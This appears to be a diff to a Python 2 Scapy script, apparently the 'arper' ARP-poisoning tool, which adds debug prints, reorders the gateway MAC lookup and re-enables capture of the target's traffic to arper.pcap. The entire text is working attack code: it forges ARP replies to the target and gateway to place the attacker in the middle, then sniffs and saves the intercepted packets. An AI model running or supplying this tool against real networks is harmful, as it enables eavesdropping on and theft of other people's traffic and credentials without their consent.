@@ -45,7 +45,7 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
 
     #signals the main thread to exit
 
-    #os.kill(os.getpid(), signal.SIGINT)
+    os.kill(os.getpid(), signal.SIGINT)
     print "target restored"
     sys.exit(0)
 
@@ -54,16 +54,27 @@ def get_mac(ip_address):
 
         #return MAC address from a response
         for s,r in responses:
+
+            #print r[Ether].src
+            #paus =raw_input("test")
             return r[Ether].src
 
         return None
 
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
 
+    print "gateway "
+    print gateway_ip
+    print gateway_mac
+    print " target"
+    print target_ip
+    print target_mac
+    #pause=raw_input("pause")
+
     poison_target=ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
-    poison_target.pdst=target_ip
+    poison_target.pdst= target_ip
     poison_target.hwdst =target_mac
 
     poison_gateway=ARP()
@@ -103,9 +114,10 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
 
 
 
-def print_packets(pkt):
-    if pkt:
-        return pkt.summary()
+# def print_packets(pkt):
+#     if pkt:
+#         print ""
+#         return pkt.summary()
 
 
 if __name__ == "__main__":
@@ -121,11 +133,11 @@ if __name__ == "__main__":
     #turn off output
     conf.verb = 0
 
-    gateway_mac = get_mac(gateway_ip)
+
 
     print "[*] Setting up %s" % interface
 
-
+    gateway_mac = get_mac(gateway_ip)
     if gateway_mac is None:
         print "Failed to get Gateway MAC. Exiting"
         sys.exit(0)
@@ -145,20 +157,21 @@ if __name__ == "__main__":
 
 
     #start poison thread
-    Pause = raw_input("ready to poison, pres enter to continue")
-    poison_thread = threading.Thread(target = poison_target, args =(gateway_ip,gateway_mac,target_ip,target_mac))
+    Pause = raw_input("ready to poison, press enter to continue")
+    poison_thread = threading.Thread(target =poison_target, args =(gateway_ip,gateway_mac,target_ip,target_mac))
     poison_thread.start()
 
     try:
         print"Starting sniffer for %d packets " % packet_count
 
         bpf_filter="ip host %s" % target_ip
-        packets= sniff(prn=print_packets,count=packet_count, filter=bpf_filter, iface=interface,store=0)
-
+        #ackets= sniff(prn=print_packets,count=packet_count, filter=bpf_filter, iface=interface,store=0)
+        #packets= sniff(count=packet_count, filter=bpf_filter, iface=interface)
+        packets= sniff(filter=bpf_filter, iface=interface)
         #packets.show()
         #print "packets",packets.show()
         #write out the captured packets
-       # wrpcap('arper.pcap',packets)
+        wrpcap('arper.pcap',packets)
 
         #restore network
         restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
